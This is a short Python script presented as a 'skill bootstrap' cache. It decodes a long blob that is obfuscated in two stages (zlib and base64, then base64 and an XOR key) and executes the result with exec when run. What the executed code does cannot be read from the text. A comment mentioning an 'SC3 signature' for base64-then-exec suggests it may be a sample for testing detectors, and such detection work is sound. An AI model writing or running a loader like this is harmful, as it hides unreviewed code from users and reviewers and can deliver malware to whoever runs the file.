#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxtVMm2sjgQfiAXJMwslXlSFAjRHSiEQdAgyvD0zb32392LXtY5VZVvqiw3AUKg9gaWQ4NhJmLfRdDQIe5sFA6UXfbAGdFbxi3BVqCxtTBOU2yyEecXScbBUtDfE2R5ZPF5kvVSbU+A7CzJt46JmjFtO8gQRO2IWBCrYgi684MHjckmmNjq0M+ds+VIc+CjLsa654JSsOkSm4PZgFTLqlxwtxfZmrFZ7bKEoRKrKCMpO0HX4CkpmLI7QzgalDMwQRqjNXf+NS+Io2Ztx2oaSt3luCx3hg0x7+iuRrrb1gBGuolZPrBcz+sujwc0qIgX39sGKh0vLwbuZi7idJzkLp19gafm7GRQHgO7BUBRZroLBLOGF5UG8ig8Ns02e6nzKTs4Fuql6SnpLZ+HI7aF6MZJ+kEY03MOR9F3vIymD0fsZlyAY79/RF5/hSLRup99WSIGTCn4bA1FPub8wPIkSJyR4e+bVa8RJwpVhCDeTBALF3xEKo0gefrGuPqBNBQeFQqWQRHJ6eAUs7JLsqAlF/09Qiv63Z8GZW3LjwWpcpgISBWxOA1w/p03m9RkVIEMyqPbzQpmh9gQMU9eJ3GC6oQieE0YlVno337Ul9WPXFkee/G/88t+fyRl8OVTqF88f+o0kKuVX8fmfcSVeMW31uPUcQmPVsniPc2r50Mm7Twikw9Mb+FfF/4D7+8Zs6coPtD8u08T0nvpHBmNjjf9CdCHTVgS6GveSj5mpnZe+4/2lfl5X6aESELajYFeVGyz34E1iZOBx4OW1VLnnMkEczPGRFU/rjI6jwrcXW7Nu225rjwx6Bd/WPue6XrrfQxggZUSs0qkZlZbrfkHR3EfmiRHhTbdn+cnbGc2DrefVd/p/+bXewII36Mw29Ss/Fy+eQK+7kby8tzSCXJTWBtZIpnspMgSOB2YuLpN/+q51rXvq1JHKuVqyG2aXRGpkuINFtdf76//+l0cwKd/9u3uIMbdNrYKtWF9hZJS6sxPrfBaLJ7LHnkKOr4i6EWbkCxld7D2SH+fbr/+kfP0D161mAH33L3upBj93bWwvBQQgV+W3Wfc7r79r8t51TfnUac3JvUksr/94dfontS1T55d2pmP2CbSezxMw+VIDcqYjd0YkiVU4tZY/WrMWm6c/vd/MZiTVfvaDx9NqIUzqMo++guueYnl"
_K = bytes.fromhex("eeff5aa233d93a1d7b79d094")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
